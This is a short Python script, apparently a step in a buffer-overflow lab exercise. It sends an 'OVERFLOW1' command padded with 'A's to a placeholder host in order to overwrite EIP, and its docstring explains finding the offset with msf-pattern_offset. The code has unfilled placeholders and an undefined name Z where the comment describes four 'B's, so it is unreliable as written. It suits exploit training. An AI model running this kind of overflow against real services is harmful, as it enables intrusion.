#!/usr/bin/python

"""
We identified the EIP being "<   >" in the last program, so in order for us
to find the offset me must run the following command.
    msf-pattern_offset -q <EIP NUMBER> #which in return gives us our
    offset
       
Once we find our offset we'll try to cleanly take over EIP by sending 
4 "B"s abd our EIP should display "42424242"    

"""
import socket

RHOST = "<IP>"  #Target IP
RPORT = <PORT> 	   #Target Port


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = "A" * <offset> + Z * 4 



s.send("OVERFLOW1 " + buf)
s.recv(1024)
s.close()
